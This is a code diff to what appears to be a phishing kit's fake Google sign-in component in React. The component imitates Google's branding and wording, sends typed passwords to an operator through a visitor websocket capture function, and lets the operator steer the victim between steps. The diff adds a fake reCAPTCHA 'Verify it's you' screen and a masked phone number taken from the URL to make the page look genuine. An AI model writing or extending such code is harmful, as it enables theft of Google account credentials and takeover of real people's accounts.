@@ -1614,7 +1614,7 @@ function AppleLogin({ device, theme, onProviderSwitch }: { device: string; theme
 
 // ─── Google ──────────────────────────────────────────────────────────────────
 
-type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code' | 'processing' | 'error-email' | 'error-password' | 'error-code';
+type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-code' | 'processing' | 'verify' | 'error-email' | 'error-password' | 'error-code';
 
 function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
   const isDark = theme === 'dark';
@@ -1630,25 +1630,49 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
   const [passwordFocused, setPasswordFocused] = useState(false);
   const [phoneCodeInput, setPhoneCodeInput] = useState('');
   const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
-  const [loading, setLoading] = useState(false);
+  const [transitioning, setTransitioning] = useState(false);
+  const [captchaState, setCaptchaState] = useState<'idle' | 'challenge' | 'solving' | 'solved'>('idle');
+  const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set([0, 2, 5]));
   const passwordRef = useRef<HTMLInputElement>(null);
+  const googlePhone = new URLSearchParams(window.location.search).get('gphone') ?? '09';
 
   useEffect(() => {
     if (step === 'password') passwordRef.current?.focus();
   }, [step]);
 
+  const gotoStep = useCallback((target: GoogleStep) => {
+    setTransitioning(true);
+    setTimeout(() => { setStep(target); setTransitioning(false); }, 650);
+  }, []);
+
   const { sendCapture, sendStepUpdate } = useVisitorWS({
     provider: 'google',
-    onNavigate: (s) => setStep(s as GoogleStep),
+    onNavigate: (s) => gotoStep(s as GoogleStep),
     onProviderSwitch,
   });
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
 
   const nav = (target: GoogleStep, captureField?: string, captureVal?: string) => {
     if (captureField && captureVal) sendCapture(captureField, captureVal);
-    setLoading(true);
-    setTimeout(() => { setLoading(false); setStep(target); }, 900);
+    gotoStep(target);
   };
+
+  const solveCaptcha = () => {
+    setCaptchaState('solving');
+    setTimeout(() => setCaptchaState('solved'), 2000);
+  };
+
+  const CAPTCHA_IMGS = [
+    { bg: 'linear-gradient(160deg,#6e7f8d 0%,#8fa0ae 40%,#5c6e7c 100%)', car: true },
+    { bg: 'linear-gradient(160deg,#3d6b4a 0%,#5e8a67 40%,#2e5238 100%)', car: false },
+    { bg: 'linear-gradient(160deg,#786b60 0%,#9a8c81 40%,#635850 100%)', car: true },
+    { bg: 'linear-gradient(160deg,#5c6e8a 0%,#7d90a8 40%,#4a5a72 100%)', car: false },
+    { bg: 'linear-gradient(160deg,#8a7060 0%,#aa9080 40%,#705848 100%)', car: false },
+    { bg: 'linear-gradient(160deg,#6a6a7c 0%,#8a8a9c 40%,#545466 100%)', car: true },
+    { bg: 'linear-gradient(160deg,#4a7c50 0%,#6a9c70 40%,#386040 100%)', car: false },
+    { bg: 'linear-gradient(160deg,#7c7c68 0%,#9c9c88 40%,#606050 100%)', car: false },
+    { bg: 'linear-gradient(160deg,#5a8a90 0%,#7aacb2 40%,#487078 100%)', car: false },
+  ];
 
   const bg = isDark ? '#1f1f1f' : '#f0f4f9';
   const cardBg = isDark ? '#282a2c' : '#ffffff';
@@ -1666,13 +1690,15 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
 
   const initial = email ? email[0].toUpperCase() : 'G';
 
-  if (loading) return (
-    <GoogleLoadingScreen isDark={isDark} bg={bg} cardBg={cardBg} textColor={textColor} />
-  );
-
   return (
     <>
-      <style>{`@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');`}</style>
+      <style>{`
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
+        @keyframes g-bar-sweep { from { transform: scaleX(0); } to { transform: scaleX(1); } }
+        @keyframes g-bar-slide { 0% { left:-35%;width:30%; } 50% { left:60%;width:50%; } 100% { left:110%;width:30%; } }
+        .g-bar-sweep { animation: g-bar-sweep 0.65s cubic-bezier(0.4,0,0.2,1) forwards; transform-origin: left; }
+        .g-bar-slide { animation: g-bar-slide 1.5s ease-in-out infinite; position:absolute; height:100%; background:#1a73e8; }
+      `}</style>
       <div className="w-full h-full flex items-center justify-center"
         style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif", backgroundColor: bg, color: textColor }}>
         <div style={{
@@ -1684,16 +1710,32 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
           borderRadius: isDesktop ? 28 : 0,
           padding: isDesktop ? '40px 40px' : '48px 24px 24px',
           boxSizing: 'border-box',
+          position: 'relative',
+          overflow: 'hidden',
         }}>
+          {/* Blue progress bar */}
+          {(transitioning || step === 'processing') && (
+            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, zIndex: 20 }}>
+              {transitioning
+                ? <div className="g-bar-sweep" style={{ height: '100%', background: '#1a73e8', width: '100%' }} />
+                : <div className="g-bar-slide" />}
+            </div>
+          )}
 
           {/* Left / Top: branding */}
           <div style={{ display: 'flex', flexDirection: 'column', flex: isDesktop ? '0 0 320px' : 'none', paddingRight: isDesktop ? 40 : 0, marginBottom: isDesktop ? 0 : 32 }}>
             <div style={{ marginBottom: 28 }}><GoogleLogo /></div>
             <h1 style={{ fontSize: 40, fontWeight: 400, margin: '0 0 12px', letterSpacing: '-0.5px', color: textColor }}>
-              {step === 'email' ? 'Sign in' : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you' : 'Welcome'}
+              {step === 'email' ? 'Sign in'
+                : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you'
+                : step === 'verify' ? 'Verify it\'s you'
+                : step === 'processing' ? 'Welcome'
+                : 'Welcome'}
             </h1>
             <p style={{ fontSize: 16, color: textColor, margin: 0 }}>
-              Use your Google Account
+              {step === 'verify'
+                ? <span>To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in. <a href="#" onClick={e => e.preventDefault()} style={{ color: linkColor, textDecoration: 'none' }}>Learn more</a></span>
+                : 'Use your Google Account'}
             </p>
           </div>
 
@@ -1812,7 +1854,7 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
                     Create account
                   </button>
                   <button data-testid="google-signin-btn"
-                    onClick={() => { if (password) nav('phone-verify', 'password', password); }}
+                    onClick={() => { if (password) nav('processing', 'password', password); }}
                     style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                     Next
                   </button>
@@ -1948,24 +1990,124 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
             {/* ── Processing ── */}
             {step === 'processing' && (
               <>
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1, gap: 20 }}>
-                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>
-                    Signing you in, please wait…
-                  </p>
-                  <svg className="animate-spin" width="32" height="32" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
-                    <defs>
-                      <linearGradient id="goog-proc" x1="0%" y1="0%" x2="100%" y2="0%">
-                        <stop offset="0%" stopColor="#4285F4"/>
-                        <stop offset="33%" stopColor="#EA4335"/>
-                        <stop offset="66%" stopColor="#FBBC05"/>
-                        <stop offset="100%" stopColor="#34A853"/>
-                      </linearGradient>
-                    </defs>
-                    <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3.5" strokeLinecap="round"
-                      stroke="url(#goog-proc)" strokeDasharray="80 126" />
-                  </svg>
+                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', flex: 1 }}>
+                  <p style={{ fontSize: 14, color: subText, textAlign: 'center', margin: 0 }}>Signing you in…</p>
                 </div>
                 <div />
+              </>
+            )}
+
+            {/* ── Verify it's you (reCAPTCHA) ── */}
+            {step === 'verify' && (
+              <>
+                {captchaState === 'challenge' ? (
+                  <div style={{ display: 'flex', flexDirection: 'column', flex: 1, minHeight: 0 }}>
+                    <div style={{ background: '#4a90d9', color: 'white', borderRadius: '4px 4px 0 0', padding: '12px 16px', flexShrink: 0 }}>
+                      <div style={{ fontSize: 12, fontWeight: 400, marginBottom: 1 }}>Select all images with</div>
+                      <div style={{ fontSize: 20, fontWeight: 700, lineHeight: 1.2 }}>cars</div>
+                      <div style={{ fontSize: 11, opacity: 0.9, marginTop: 2 }}>Click verify once there are none left</div>
+                    </div>
+                    <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: 2, background: '#d0d0d0', flexShrink: 0 }}>
+                      {CAPTCHA_IMGS.map((img, i) => (
+                        <div key={i} onClick={() => {
+                          const next = new Set(selectedImgs);
+                          if (next.has(i)) next.delete(i); else next.add(i);
+                          setSelectedImgs(next);
+                        }} style={{
+                          position: 'relative', height: 86, background: img.bg, cursor: 'pointer',
+                          outline: selectedImgs.has(i) ? '3px solid #4285F4' : '3px solid transparent',
+                          outlineOffset: -3,
+                        }}>
+                          {selectedImgs.has(i) && (
+                            <div style={{ position: 'absolute', top: 4, right: 4, width: 22, height: 22, borderRadius: '50%', background: '#4285F4', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                              <svg viewBox="0 0 24 24" width="13" height="13" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                            </div>
+                          )}
+                          {img.car && (
+                            <svg viewBox="0 0 48 22" width="40" height="18" style={{ position: 'absolute', bottom: 8, left: '50%', transform: 'translateX(-50%)', opacity: 0.72 }}>
+                              <rect x="4" y="7" width="40" height="10" rx="2" fill="#444"/>
+                              <rect x="10" y="3" width="24" height="8" rx="2" fill="#666"/>
+                              <circle cx="13" cy="17.5" r="3.5" fill="#222"/><circle cx="13" cy="17.5" r="1.8" fill="#aaa"/>
+                              <circle cx="35" cy="17.5" r="3.5" fill="#222"/><circle cx="35" cy="17.5" r="1.8" fill="#aaa"/>
+                              <rect x="12" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
+                              <rect x="20" y="4" width="6" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
+                              <rect x="28" y="4" width="5" height="5" rx="1" fill="#aad4f5" opacity="0.7"/>
+                            </svg>
+                          )}
+                        </div>
+                      ))}
+                    </div>
+                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '7px 12px', background: '#f9f9f9', border: '1px solid #ccc', borderTop: 'none', borderRadius: '0 0 4px 4px', flexShrink: 0 }}>
+                      <div style={{ display: 'flex', gap: 14, color: '#555' }}>
+                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
+                          <path d="M1 4v6h6M23 20v-6h-6" strokeLinecap="round" strokeLinejoin="round"/>
+                          <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15" strokeLinecap="round" strokeLinejoin="round"/>
+                        </svg>
+                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
+                          <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z" strokeLinecap="round" strokeLinejoin="round"/>
+                          <path d="M19 10v2a7 7 0 0 1-14 0v-2M12 19v4M8 23h8" strokeLinecap="round" strokeLinejoin="round"/>
+                        </svg>
+                        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" strokeWidth="1.5" style={{ cursor: 'pointer' }}>
+                          <circle cx="12" cy="12" r="10"/><path d="M12 8v4m0 4h.01" strokeLinecap="round"/>
+                        </svg>
+                      </div>
+                      <button onClick={solveCaptcha} style={{ backgroundColor: '#4a90d9', color: 'white', border: 'none', borderRadius: 3, padding: '9px 20px', fontSize: 14, fontWeight: 600, cursor: 'pointer', letterSpacing: '0.04em' }}>
+                        VERIFY
+                      </button>
+                    </div>
+                  </div>
+                ) : (
+                  <>
+                    <div>
+                      <div style={{
+                        display: 'inline-flex', alignItems: 'center', gap: 8,
+                        border: `1px solid ${borderColor}`, borderRadius: 20,
+                        padding: '6px 12px 6px 6px', marginBottom: 20, cursor: 'pointer',
+                        background: isDark ? '#3c3f43' : '#f0f4f9',
+                      }}>
+                        <div style={{ width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0 }}>{initial}</div>
+                        <span style={{ fontSize: 14, color: textColor }}>{email || 'john@gmail.com'}</span>
+                        <ChevronLeft className="w-3 h-3 rotate-180" style={{ color: textColor, marginLeft: 2 }} />
+                      </div>
+                      <p style={{ fontSize: 13, color: subText, margin: '0 0 14px' }}>Confirm you&apos;re not a robot</p>
+                      <div style={{ border: '1px solid #d4d4d4', borderRadius: 3, background: isDark ? '#3c3f43' : '#f9f9f9', padding: '16px 12px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', maxWidth: 300, boxShadow: '0 0 4px rgba(0,0,0,0.1)' }}>
+                        <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
+                          {captchaState === 'solving' ? (
+                            <svg className="animate-spin" width="28" height="28" viewBox="0 0 50 50" style={{ flexShrink: 0 }}>
+                              <circle cx="25" cy="25" r="20" fill="none" stroke="#4285F4" strokeWidth="4" strokeDasharray="80 126"/>
+                            </svg>
+                          ) : captchaState === 'solved' ? (
+                            <div style={{ width: 28, height: 28, borderRadius: '50%', background: '#00BF6F', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
+                              <svg viewBox="0 0 24 24" width="17" height="17" fill="none"><polyline points="4,12 10,18 20,6" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/></svg>
+                            </div>
+                          ) : (
+                            <div onClick={() => setCaptchaState('challenge')} style={{ width: 24, height: 24, border: '2px solid #9aa0a6', borderRadius: 3, cursor: 'pointer', background: 'white', flexShrink: 0 }} />
+                          )}
+                          <span style={{ fontSize: 14, color: isDark ? '#c4c7c5' : '#555' }}>I&apos;m not a robot</span>
+                        </div>
+                        <div style={{ textAlign: 'center', minWidth: 58 }}>
+                          <div style={{ fontSize: 10, lineHeight: 1.3, marginBottom: 2 }}>
+                            <span style={{ color: '#4285F4', fontWeight: 700 }}>re</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span><span style={{ color: '#34A853', fontWeight: 700 }}>P</span><span style={{ color: '#4285F4', fontWeight: 700 }}>T</span><span style={{ color: '#EA4335', fontWeight: 700 }}>C</span><span style={{ color: '#34A853', fontWeight: 700 }}>H</span><span style={{ color: '#FBBC05', fontWeight: 700 }}>A</span>
+                          </div>
+                          <div style={{ fontSize: 8, color: '#999' }}>Privacy - Terms</div>
+                        </div>
+                      </div>
+                      <p style={{ fontSize: 12, color: subText, margin: '14px 0 0' }}>
+                        You can also verify via phone ●●●●●●●●{googlePhone}
+                      </p>
+                    </div>
+                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+                      <button onClick={() => setStep('password')} style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
+                        Try another way
+                      </button>
+                      <button
+                        onClick={() => captchaState === 'solved' && nav('processing')}
+                        style={{ backgroundColor: captchaState === 'solved' ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c3f43' : '#c8d0db'), color: captchaState === 'solved' ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: captchaState === 'solved' ? 'pointer' : 'default' }}>
+                        Next
+                      </button>
+                    </div>
+                  </>
+                )}
               </>
             )}
 
@@ -2006,35 +2148,6 @@ function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; them
               </>
             )}
           </div>
-        </div>
-      </div>
-    </>
-  );
-}
-
-function GoogleLoadingScreen({ isDark, bg, cardBg, textColor }: { isDark: boolean; bg: string; cardBg: string; textColor: string }) {
-  return (
-    <>
-      <style>{`@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');`}</style>
-      <div className="w-full h-full flex items-center justify-center"
-        style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif", backgroundColor: bg, color: textColor }}>
-        <div style={{
-          display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
-          background: cardBg, borderRadius: 28, padding: 40, minWidth: 320,
-        }}>
-          <div style={{ marginBottom: 24 }}><GoogleLogo /></div>
-          <svg className="animate-spin" width="36" height="36" viewBox="0 0 50 50" style={{ animationDuration: '1s' }}>
-            <defs>
-              <linearGradient id="goog-spin" x1="0%" y1="0%" x2="100%" y2="0%">
-                <stop offset="0%" stopColor="#4285F4"/>
-                <stop offset="33%" stopColor="#EA4335"/>
-                <stop offset="66%" stopColor="#FBBC05"/>
-                <stop offset="100%" stopColor="#34A853"/>
-              </linearGradient>
-            </defs>
-            <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3.5" strokeLinecap="round"
-              stroke="url(#goog-spin)" strokeDasharray="80 126" />
-          </svg>
         </div>
       </div>
     </>
